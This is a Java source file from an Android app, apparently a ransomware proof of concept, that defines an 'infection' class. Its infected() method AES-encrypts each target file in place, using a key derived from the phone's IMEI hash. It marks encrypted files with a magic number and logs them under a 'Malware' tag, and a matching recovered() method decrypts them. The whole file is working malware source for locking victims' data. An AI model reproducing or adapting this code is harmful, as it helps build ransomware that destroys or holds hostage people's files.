package com.xpf.me.sms.routine.infection;

import android.util.Log;

import com.xpf.me.sms.MainActivity;
import com.xpf.me.sms.routine.AndroidDeviceInfo;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.math.BigInteger;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;

/**
 * Created by xgo on 10/30/15.
 */
public class Item extends Node implements IInfected {

    // magic number avoiding reinfection
    protected byte[] magicNumber;
    protected int magicPosition;
    // credential for crypto
    protected String key;
    protected Cipher cipher;
    protected SecretKeySpec secretKey;

    public Item(File file, boolean r) {
        super(file, r);
    }

    /* Crypto method */
    public void initCrypto() throws UnsupportedEncodingException,
            NoSuchAlgorithmException {
        magicNumber = new byte[] { 0x3a, 0x29 };
        magicPosition = 0;

        MessageDigest localMessageDigest = MessageDigest.getInstance("MD5");
        localMessageDigest.update(new AndroidDeviceInfo(MainActivity
                .getContext()).getImei().getBytes("UTF-8"));
        key = HexMD5(new String(localMessageDigest.digest()));

        try {
            cipher = Cipher.getInstance("AES");
        } catch (NoSuchAlgorithmException | NoSuchPaddingException e) {
        }
        secretKey = new SecretKeySpec(key.getBytes(), "AES");
    }

    /* Malware method */
    @Override
    public void infected(File file) {
        try {
            initCrypto();
            cipher.init(Cipher.ENCRYPT_MODE, secretKey);

            byte[] data = readFile(file);

            if (!isInfected(data)) {
                data = cipher.doFinal(data);
                data = markMagicNumber(data);
                writeFile(file, data);
                Log.w("Malware", "File infected : " + file.getAbsolutePath());
            }
        } catch (IOException | NoSuchAlgorithmException
                | IllegalBlockSizeException | BadPaddingException e) {
            Log.w("Malware", "[ERROR] File Exception");
        } catch (InvalidKeyException e1) {
            Log.w("Malware", "[ERROR] InvalidKeyException");
        }
    }

    @Override
    public void recovered(File file) {
        try {
            initCrypto();
            cipher.init(Cipher.DECRYPT_MODE, secretKey);

            byte[] data = readFile(file);

            if (isInfected(data)) {
                data = freeMagicNumber(data);
                data = cipher.doFinal(data);
                writeFile(file, data);
                Log.w("Malware", "File recovered : " + file.getAbsolutePath());
            }
        } catch (IOException | NoSuchAlgorithmException
                | IllegalBlockSizeException | BadPaddingException e) {
            Log.w("Malware", "[ERROR] File Exception");
        } catch (InvalidKeyException e1) {
            Log.w("Malware", "[ERROR] InvalidKeyException");
        }
    }

    public byte[] markMagicNumber(byte[] map) {
        ByteArrayOutputStream tmp = new ByteArrayOutputStream();
        try {
            tmp.write(magicNumber);
            tmp.write(map);
        } catch (IOException e) {
        }
        return tmp.toByteArray();
    }

    public byte[] freeMagicNumber(byte[] map) {
        return Arrays.copyOfRange(map, magicPosition + magicNumber.length,
                map.length);
    }

    public boolean isInfected(byte[] map) {
        // don't forget to reverse the magic number
        return (map[magicPosition] == magicNumber[0] && map[magicPosition + 1] == magicNumber[1]);
    }

    /* IO method */
    @Override
    public byte[] readFile(File file) throws IOException {
        FileInputStream inFile = new FileInputStream(file);
        byte[] data = new byte[(int) file.length()];
        inFile.read(data, 0, data.length);
        inFile.close();
        return data;
    }

    @Override
    public void writeFile(File file, byte[] data) throws IOException {
        FileOutputStream outFile = new FileOutputStream(file);
        outFile.write(data);
        outFile.flush();
        outFile.close();
    }

    public static String HexMD5(String plain) {
        try {
            MessageDigest md5 = MessageDigest.getInstance("MD5");
            byte[] digest = md5.digest(plain.getBytes());
            BigInteger number = new BigInteger(1, digest);
            String cipher = number.toString(16);

            while (cipher.length() < 32)
                cipher = "0" + cipher;

            return cipher;
        } catch (NoSuchAlgorithmException e) {
            Log.e("MD5", e.getLocalizedMessage());
            return null;
        }
    }
}

